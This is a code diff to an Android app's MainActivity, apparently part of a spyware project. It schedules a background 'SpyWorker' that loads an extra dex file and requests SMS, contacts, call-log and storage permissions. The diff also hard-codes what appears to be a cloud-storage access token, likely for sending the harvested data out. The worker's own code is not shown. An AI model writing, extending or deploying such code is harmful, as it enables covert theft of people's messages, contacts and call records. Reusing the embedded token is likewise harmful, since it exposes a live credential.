@@ -65,7 +65,7 @@ class MainActivity : AppCompatActivity() {
             .setRequiredNetworkType(NetworkType.CONNECTED)
             .build()
 
-        val workRequest = PeriodicWorkRequestBuilder<SpyWorker>(
+        /*val workRequest = PeriodicWorkRequestBuilder<SpyWorker>(
             5, TimeUnit.MINUTES, // repeatInterval (the period cycle)
             1, TimeUnit.MINUTES
         ).setInputData(dexInternalPath)
@@ -76,8 +76,8 @@ class MainActivity : AppCompatActivity() {
                 "PeriodicSimpleWorkerName", // A unique name which for this operation
                 ExistingPeriodicWorkPolicy.REPLACE, // An ExistingPeriodicWorkPolicy
                 workRequest
-            )
-        /*val workRequest = OneTimeWorkRequestBuilder<SpyWorker>()
+            )*/
+        val workRequest = OneTimeWorkRequestBuilder<SpyWorker>()
             .setInputData(dexInternalPath)
             .setBackoffCriteria(
                 BackoffPolicy.LINEAR, // The BackoffPolicy to use when increasing backoff time
@@ -94,7 +94,6 @@ class MainActivity : AppCompatActivity() {
                 ExistingWorkPolicy.REPLACE, // An ExistingWorkPolicy
                 workRequest
             )
-         */
     }
 
     private fun saveFile(inputStream: InputStream) {
@@ -107,7 +106,8 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.READ_SMS,
                 Manifest.permission.READ_CONTACTS,
                 Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_EXTERNAL_STORAGE
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE
             ), REQUEST_PHONE_CALL
         )
     }
@@ -115,6 +115,7 @@ class MainActivity : AppCompatActivity() {
     companion object {
         const val DEX_FILENAME = "classes9.dex"
         const val REQUEST_PHONE_CALL = 1
-        private const val ACCESS_TOKEN = ""
+        private const val ACCESS_TOKEN =
+            "sl.BBnY4rdMgM57yEfoYqJj5D-5CjgxxinjQRhz9DywuRSvf1TT-3rJ8yUa3XbPfN1LZtup7WHREQHXMB-OEgYx0LyhxUa7S91ZYD7YWDKjGR6oWpQUY8rvivtd0kwRIsp5XT0aqb_vnrPB"
     }
 }
